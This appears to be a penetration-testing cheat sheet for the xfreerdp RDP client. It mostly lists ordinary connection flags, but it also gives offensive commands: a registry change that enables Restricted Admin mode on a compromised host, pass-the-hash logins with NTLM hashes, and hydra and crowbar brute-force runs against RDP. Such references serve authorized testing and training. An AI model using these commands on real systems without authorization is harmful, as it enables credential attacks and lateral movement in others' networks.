# xfreerdp — RDP Client Reference

**Tags:** #rdp #windows #lateral-movement
**Port:** 3389

---

## Basic Connections

```bash
# Password auth
xfreerdp /v:$TARGET /u:$USER /p:$PASS /dynamic-resolution

# With domain
xfreerdp /v:$TARGET /u:$USER /p:$PASS /d:$DOMAIN /dynamic-resolution

# With port
xfreerdp /v:$TARGET:3389 /u:$USER /p:$PASS

# Ignore cert warnings
xfreerdp /v:$TARGET /u:$USER /p:$PASS /cert:ignore
```

## Pass-the-Hash (Requires Restricted Admin Mode)

```bash
# Enable Restricted Admin on target (if you have RCE):
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0

# Connect with hash
xfreerdp /v:$TARGET /u:$USER /pth:NTLMHASH /d:$DOMAIN
```

## File Transfer via RDP

```bash
# Mount local drive
xfreerdp /v:$TARGET /u:$USER /p:$PASS /drive:/tmp,share

# Mount specific local dir
xfreerdp /v:$TARGET /u:$USER /p:$PASS /drive:tools,/opt/tools

# On Windows target: \\tsclient\share
```

## Useful Flags

```bash
# Full screen
xfreerdp /v:$TARGET /u:$USER /p:$PASS /f

# Specific resolution
xfreerdp /v:$TARGET /u:$USER /p:$PASS /size:1920x1080

# Clipboard sharing
xfreerdp /v:$TARGET /u:$USER /p:$PASS /clipboard

# Audio
xfreerdp /v:$TARGET /u:$USER /p:$PASS /audio-mode:0

# All features
xfreerdp /v:$TARGET /u:$USER /p:$PASS /dynamic-resolution /clipboard /drive:/tmp,share /cert:ignore
```

## Restricted Admin Mode (Hash Login)

```bash
# Check if enabled (from target)
reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin
# 0 = enabled, 1 = disabled

# From Kali
xfreerdp /v:$TARGET /u:Administrator /pth:AABBCCDDEEFF /d:$DOMAIN /cert:ignore
```

## Brute Force

```bash
hydra -l $USER -P /usr/share/wordlists/rockyou.txt rdp://$TARGET
crowbar -b rdp -s $TARGET/32 -u $USER -C /usr/share/wordlists/rockyou.txt
```
